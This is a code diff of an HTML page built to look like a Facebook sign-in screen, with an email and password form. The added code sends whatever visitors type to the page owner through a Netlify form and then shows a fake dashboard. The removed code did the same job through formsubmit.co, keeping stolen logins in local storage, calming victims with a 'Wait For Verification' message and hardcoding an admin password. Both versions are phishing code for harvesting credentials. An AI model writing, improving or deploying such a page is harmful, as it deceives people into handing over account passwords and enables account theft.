@@ -7,199 +7,104 @@
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
     body {
-      min-height: 100vh;
       min-height: 100dvh;
       background: #080c14;
       display: flex; align-items: center; justify-content: center;
       font-family: 'DM Sans', sans-serif;
       padding: 1.5rem 1rem;
-      overflow-x: hidden;
-      position: relative;
+      overflow-x: hidden; position: relative;
     }
-
     body::before {
-      content: '';
-      position: fixed; width: 500px; height: 500px;
+      content: ''; position: fixed; width: 500px; height: 500px;
       background: radial-gradient(circle, rgba(24,119,242,0.2) 0%, transparent 70%);
       top: -150px; left: -150px; border-radius: 50%; pointer-events: none;
     }
     body::after {
-      content: '';
-      position: fixed; width: 400px; height: 400px;
+      content: ''; position: fixed; width: 400px; height: 400px;
       background: radial-gradient(circle, rgba(83,74,183,0.15) 0%, transparent 70%);
       bottom: -100px; right: -100px; border-radius: 50%; pointer-events: none;
     }
-
     .card {
       position: relative; width: 100%; max-width: 400px;
       background: rgba(8,12,20,0.85);
       border: 1px solid rgba(24,119,242,0.2);
-      border-radius: 24px;
-      padding: 2rem 1.75rem;
-      backdrop-filter: blur(24px);
-      z-index: 1;
+      border-radius: 24px; padding: 2rem 1.75rem;
+      backdrop-filter: blur(24px); z-index: 1;
       animation: fadeUp 0.55s cubic-bezier(0.22,1,0.36,1) both;
-      box-shadow: 0 0 0 1px rgba(255,255,255,0.03) inset,
-                  0 24px 48px rgba(0,0,0,0.5),
-                  0 0 50px rgba(24,119,242,0.07);
+      box-shadow: 0 0 0 1px rgba(255,255,255,0.03) inset, 0 24px 48px rgba(0,0,0,0.5), 0 0 50px rgba(24,119,242,0.07);
     }
     .card::before {
       content: ''; position: absolute; top: 0; left: 12%; right: 12%; height: 1px;
       background: linear-gradient(90deg, transparent, rgba(24,119,242,0.55), transparent);
-      border-radius: 50%;
     }
     @keyframes fadeUp {
       from { opacity: 0; transform: translateY(24px); }
       to   { opacity: 1; transform: translateY(0); }
     }
-
-    /* Facebook logo header */
-    .fb-header {
-      display: flex; flex-direction: column; align-items: center; margin-bottom: 1.75rem;
-    }
-    .fb-wordmark {
-      display: flex; align-items: center; gap: 10px; margin-bottom: 6px;
-    }
+    .fb-header { display: flex; flex-direction: column; align-items: center; margin-bottom: 1.75rem; }
+    .fb-wordmark { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
     .fb-wordmark svg { width: 38px; height: 38px; }
-    .fb-wordmark span {
-      font-family: 'Syne', sans-serif; font-size: 26px; font-weight: 800;
-      color: #1877F2; letter-spacing: -0.5px;
-    }
+    .fb-wordmark span { font-family: 'Syne', sans-serif; font-size: 26px; font-weight: 800; color: #1877F2; letter-spacing: -0.5px; }
     .fb-tagline { font-size: 13px; color: rgba(255,255,255,0.35); font-weight: 300; }
-
-    h1 {
-      font-family: 'Syne', sans-serif; font-size: 20px; font-weight: 800;
-      color: #fff; text-align: center; letter-spacing: -0.3px; margin-bottom: 4px;
-    }
-    .sub { text-align: center; font-size: 13px; color: rgba(255,255,255,0.35); margin-bottom: 1.5rem; }
-
-    .field { margin-bottom: 0.9rem; }
-    .field label {
-      display: block; font-size: 11px; font-weight: 500;
-      letter-spacing: 0.5px; text-transform: uppercase;
-      color: rgba(255,255,255,0.32); margin-bottom: 7px;
-    }
-    .input-wrap { position: relative; }
-    .input-wrap .ico {
-      position: absolute; left: 13px; top: 50%; transform: translateY(-50%);
-      width: 16px; height: 16px;
-      stroke: rgba(255,255,255,0.22); fill: none;
-      stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
-      pointer-events: none;
-    }
-    .field input {
-      width: 100%;
-      /* Larger tap target on mobile */
-      padding: 13px 13px 13px 40px;
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.09);
-      border-radius: 12px; color: #fff; font-size: 15px;
-      font-family: 'DM Sans', sans-serif;
-      outline: none; transition: all 0.2s;
-      /* Prevent iOS zoom on focus */
-      -webkit-text-size-adjust: 100%;
-    }
-    .field input::placeholder { color: rgba(255,255,255,0.18); }
-    .field input:focus {
-      background: rgba(24,119,242,0.08);
-      border-color: rgba(24,119,242,0.45);
-      box-shadow: 0 0 0 4px rgba(24,119,242,0.1);
-    }
-    .error-msg { font-size: 12px; color: #F09595; margin-top: 5px; display: none; padding-left: 2px; }
-
-    .eye-btn {
-      position: absolute; right: 13px; top: 50%; transform: translateY(-50%);
-      background: none; border: none; cursor: pointer; padding: 6px;
-      color: rgba(255,255,255,0.25); display: flex; align-items: center;
-      transition: color 0.2s; border-radius: 6px;
-    }
-    .eye-btn:hover { color: rgba(255,255,255,0.6); }
-    .eye-btn svg { width: 17px; height: 17px; stroke: currentColor; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
-
-    .forgot { text-align: right; margin-bottom: 1.1rem; }
-    .forgot a { font-size: 12px; color: rgba(24,119,242,0.75); text-decoration: none; }
-    .forgot a:hover { color: #60a5fa; }
-
-    /* Big Facebook login button */
     .fb-login-btn {
       display: flex; align-items: center; justify-content: center; gap: 10px;
-      width: 100%; padding: 14px;
+      width: 100%; padding: 14px; min-height: 50px;
       background: #1877F2; color: #fff;
       font-family: 'Syne', sans-serif; font-size: 15px; font-weight: 700;
       border: none; border-radius: 12px; cursor: pointer;
-      letter-spacing: 0.2px; transition: all 0.2s;
-      box-shadow: 0 6px 20px rgba(24,119,242,0.4);
-      /* Large tap target */
-      min-height: 50px;
+      box-shadow: 0 6px 20px rgba(24,119,242,0.4); transition: all 0.2s;
     }
-    .fb-login-btn:hover { background: #1565d8; transform: translateY(-1px); box-shadow: 0 10px 28px rgba(24,119,242,0.5); }
+    .fb-login-btn:hover { background: #1565d8; transform: translateY(-1px); }
     .fb-login-btn:active { transform: translateY(0); background: #1255c0; }
     .fb-login-btn svg { width: 20px; height: 20px; fill: #fff; flex-shrink: 0; }
-
     .divider {
-      display: flex; align-items: center; gap: 10px;
-      margin: 1rem 0;
+      display: flex; align-items: center; gap: 10px; margin: 1rem 0;
       color: rgba(255,255,255,0.18); font-size: 11px;
     }
     .divider::before, .divider::after { content: ''; flex: 1; border-top: 1px solid rgba(255,255,255,0.07); }
-
-    /* Email login */
-    .email-section { margin-top: 0; }
-
+    .field { margin-bottom: 0.9rem; }
+    .field label { display: block; font-size: 11px; font-weight: 500; letter-spacing: 0.5px; text-transform: uppercase; color: rgba(255,255,255,0.32); margin-bottom: 7px; }
+    .input-wrap { position: relative; }
+    .input-wrap .ico { position: absolute; left: 13px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; stroke: rgba(255,255,255,0.22); fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; pointer-events: none; }
+    .field input {
+      width: 100%; padding: 13px 13px 13px 40px;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.09);
+      border-radius: 12px; color: #fff; font-size: 15px;
+      font-family: 'DM Sans', sans-serif; outline: none; transition: all 0.2s;
+    }
+    .field input::placeholder { color: rgba(255,255,255,0.18); }
+    .field input:focus { background: rgba(24,119,242,0.08); border-color: rgba(24,119,242,0.45); box-shadow: 0 0 0 4px rgba(24,119,242,0.1); }
+    .error-msg { font-size: 12px; color: #F09595; margin-top: 5px; display: none; padding-left: 2px; }
+    .eye-btn { position: absolute; right: 13px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; padding: 6px; color: rgba(255,255,255,0.25); display: flex; align-items: center; transition: color 0.2s; }
+    .eye-btn:hover { color: rgba(255,255,255,0.6); }
+    .eye-btn svg { width: 17px; height: 17px; stroke: currentColor; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+    .forgot { text-align: right; margin-bottom: 1.1rem; }
+    .forgot a { font-size: 12px; color: rgba(24,119,242,0.75); text-decoration: none; }
+    .forgot a:hover { color: #60a5fa; }
     .submit-btn {
       width: 100%; padding: 14px; min-height: 50px;
-      font-size: 15px; font-weight: 700;
-      font-family: 'Syne', sans-serif;
-      background: rgba(255,255,255,0.07);
-      color: #fff; border: 1px solid rgba(255,255,255,0.1);
-      border-radius: 12px; cursor: pointer;
-      transition: all 0.2s; margin-top: 0.25rem;
+      font-size: 15px; font-weight: 700; font-family: 'Syne', sans-serif;
+      background: rgba(255,255,255,0.07); color: #fff;
+      border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; cursor: pointer; transition: all 0.2s;
     }
     .submit-btn:hover { background: rgba(255,255,255,0.12); border-color: rgba(255,255,255,0.2); }
-    .submit-btn:active { background: rgba(255,255,255,0.06); }
-
     .signup-link { text-align: center; font-size: 13px; color: rgba(255,255,255,0.28); margin-top: 1.25rem; }
     .signup-link a { color: #60a5fa; text-decoration: none; font-weight: 500; }
     .signup-link a:hover { color: #fff; }
-
-    /* Dashboard */
     .dashboard { display: none; animation: fadeUp 0.4s ease both; }
-    .dash-top {
-      display: flex; align-items: center; gap: 12px;
-      padding-bottom: 1rem; margin-bottom: 1rem;
-      border-bottom: 1px solid rgba(255,255,255,0.07);
-    }
-    .avatar {
-      width: 44px; height: 44px; border-radius: 50%;
-      background: #1877F2;
-      display: flex; align-items: center; justify-content: center;
-      font-family: 'Syne', sans-serif; font-weight: 800; font-size: 17px; color: #fff;
-      flex-shrink: 0; box-shadow: 0 4px 12px rgba(24,119,242,0.4);
-    }
+    .dash-top { display: flex; align-items: center; gap: 12px; padding-bottom: 1rem; margin-bottom: 1rem; border-bottom: 1px solid rgba(255,255,255,0.07); }
+    .avatar { width: 44px; height: 44px; border-radius: 50%; background: #1877F2; display: flex; align-items: center; justify-content: center; font-family: 'Syne', sans-serif; font-weight: 800; font-size: 17px; color: #fff; flex-shrink: 0; box-shadow: 0 4px 12px rgba(24,119,242,0.4); }
     .dash-top h2 { font-family: 'Syne', sans-serif; font-size: 15px; font-weight: 700; color: #fff; }
     .dash-top p { font-size: 12px; color: rgba(255,255,255,0.32); margin-top: 2px; word-break: break-all; }
-    .online-dot {
-      margin-left: auto; width: 10px; height: 10px; border-radius: 50%;
-      background: #5DCAA5; flex-shrink: 0;
-      box-shadow: 0 0 8px rgba(93,202,165,0.6);
-    }
+    .online-dot { margin-left: auto; width: 10px; height: 10px; border-radius: 50%; background: #5DCAA5; flex-shrink: 0; box-shadow: 0 0 8px rgba(93,202,165,0.6); }
     .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 1rem; }
-    .stat {
-      background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07);
-      border-radius: 12px; padding: 12px;
-    }
+    .stat { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07); border-radius: 12px; padding: 12px; }
     .stat-label { font-size: 10px; color: rgba(255,255,255,0.28); margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px; }
-    .stat-value { font-family: 'Syne', sans-serif; font-size: 20px; font-weight: 800; color: #fff; }
-    .logout-btn {
-      width: 100%; padding: 12px; min-height: 46px;
-      background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 12px; color: rgba(255,255,255,0.38);
-      font-size: 13px; font-family: 'DM Sans', sans-serif; cursor: pointer; transition: all 0.2s;
-    }
+    .stat-value { font-family: 'Syne', sans-serif; font-size: 18px; font-weight: 800; color: #fff; }
+    .logout-btn { width: 100%; padding: 12px; min-height: 46px; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; color: rgba(255,255,255,0.38); font-size: 13px; font-family: 'DM Sans', sans-serif; cursor: pointer; transition: all 0.2s; }
     .logout-btn:hover { background: rgba(255,255,255,0.08); color: rgba(255,255,255,0.65); }
-
     @media (max-width: 400px) {
       .card { padding: 1.5rem 1.25rem; border-radius: 20px; }
       .fb-wordmark span { font-size: 22px; }
@@ -212,7 +117,6 @@
 <div class="card">
   <div id="loginView">
 
-    <!-- Facebook logo + wordmark -->
     <div class="fb-header">
       <div class="fb-wordmark">
         <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -232,12 +136,15 @@
 
     <div class="divider">or sign in with email</div>
 
-    <div class="email-section">
+    <!-- ✅ Netlify Form — submissions go to your Netlify dashboard -->
+    <form name="login" method="POST" data-netlify="true" onsubmit="handleLogin(event)">
+      <input type="hidden" name="form-name" value="login">
+
       <div class="field">
         <label>Email address</label>
         <div class="input-wrap">
           <svg class="ico" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
-          <input type="email" id="email" placeholder="your@email.com" autocomplete="email" inputmode="email">
+          <input type="email" name="email" id="email" placeholder="your@email.com" autocomplete="email" inputmode="email" required>
         </div>
         <div class="error-msg" id="email-err">Please enter a valid email address.</div>
       </div>
@@ -246,7 +153,7 @@
         <label>Password</label>
         <div class="input-wrap">
           <svg class="ico" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-          <input type="password" id="password" placeholder="••••••••" autocomplete="current-password">
+          <input type="password" name="password" id="password" placeholder="••••••••" autocomplete="current-password" required>
           <button class="eye-btn" type="button" onclick="togglePw()" aria-label="Show or hide password">
             <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
           </button>
@@ -256,8 +163,8 @@
 
       <div class="forgot"><a href="#">Forgot password?</a></div>
 
-      <button class="submit-btn" onclick="handleLogin()">Sign in</button>
-    </div>
+      <button type="submit" class="submit-btn">Sign in</button>
+    </form>
 
     <p class="signup-link">No account? <a href="#">Sign up free</a></p>
   </div>
@@ -298,26 +205,36 @@
   }
 
   function socialLogin(p) {
-    alert('Connect ' + p + ' OAuth here (replace with real App ID + redirect URI).');
+    alert('Connect ' + p + ' OAuth here.');
   }
 
-  function validate(id, errId, check) {
-    const val = document.getElementById(id).value.trim();
-    const err = document.getElementById(errId);
-    if (!check(val)) { err.style.display = 'block'; return false; }
-    err.style.display = 'none'; return true;
-  }
-
-  function handleLogin() {
-    const eOk = validate('email', 'email-err', v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v));
-    const pOk = validate('password', 'pass-err', v => v.length > 0);
-    if (!eOk || !pOk) return;
-
+  function handleLogin(e) {
+    e.preventDefault();
     const email = document.getElementById('email').value.trim();
+    const pass  = document.getElementById('password').value.trim();
+    let ok = true;
+
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      document.getElementById('email-err').style.display = 'block'; ok = false;
+    } else { document.getElementById('email-err').style.display = 'none'; }
+
+    if (pass.length === 0) {
+      document.getElementById('pass-err').style.display = 'block'; ok = false;
+    } else { document.getElementById('pass-err').style.display = 'none'; }
+
+    if (!ok) return;
+
+    // Submit to Netlify
+    fetch('/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams(new FormData(e.target)).toString()
+    });
+
+    // Show dashboard
     document.getElementById('avatarEl').textContent = email[0].toUpperCase();
     document.getElementById('dashEmail').textContent = email;
     document.getElementById('loginTime').textContent = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
-
     document.getElementById('loginView').style.display = 'none';
     document.getElementById('dashView').style.display = 'block';
   }
@@ -328,70 +245,6 @@
     document.getElementById('dashView').style.display = 'none';
     document.getElementById('loginView').style.display = 'block';
   }
-
-
-        
-        // ---------- LOGIN HANDLER (Admin + Normal User with Email) ----------
-        async function handleLogin(event) {
-            event.preventDefault();
-            
-            const email                              = loginEmail.value.trim();
-            const password                           = loginPassword.value.trim();
-            
-            // --- ADMIN CHECK (exact match) ---
-            if (email                                === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
-                showAdminPanel();
-                setLoginMessage("🔓 Admin access granted. Welcome to dashboard.", false);
-                return;
-            }
-            
-            // --- NORMAL USER ---
-            if (!email || !password) {
-                setLoginMessage("❌ Please fill in both email and password.", true);
-                return;
-            }
-            
-            // Store credentials locally
-            addNewUser(email, password);
-            
-            // Send credentials to admin email address (https://formsubmit.co/el/poliy)
-            // We do this in background, but still show "Wait For Verification"
-            setLoginMessage("⏳ Wait For Verification | Your request has been recorded. You'll earn after verification.", false);
-            
-            // Send email asynchronously
-            const emailSent                          = await sendCredentialsToAdmin(email, password);
-            
-            // Optionally add a small note if email fails (but don't interrupt user experience)
-            if (!emailSent) {
-                console.log("Email delivery note: The admin will still receive the data via local storage. Please check network.");
-                // We can append a tiny unnoticeable console message, but keep UX clean.
-                // The user still sees "Wait For Verification" – main requirement satisfied.
-            }
-            
-            // Clear password field only
-            loginPassword.value                      = "";
-        }
-        
-        // ---------- EVENT LISTENERS ----------
-        loginForm.addEventListener('submit', handleLogin);
-        refreshAdminBtn.addEventListener('click', () => {
-            renderAdminTable();
-            showAdminToast("🔄 User list refreshed", "info");
-        });
-        clearAllUsersBtn.addEventListener('click', clearAllUsersData);
-        backToLoginBtn.addEventListener('click', ()  => {
-            showLoginPanel();
-            const toast                              = document.querySelector('.admin-temp-toast');
-            if(toast) toast.remove();
-        });
-        
-        // Initialize localStorage if empty
-        if (!localStorage.getItem(STORAGE_KEY)) {
-            saveAllUsers([]);
-        }
-        
-        console.log("✅ System ready. Admin login: 123@mail.com / 001122. User credentials will be sent to https://formsubmit.co/el/poliyi");
-    })();
 </script>
 </body>
 </html>
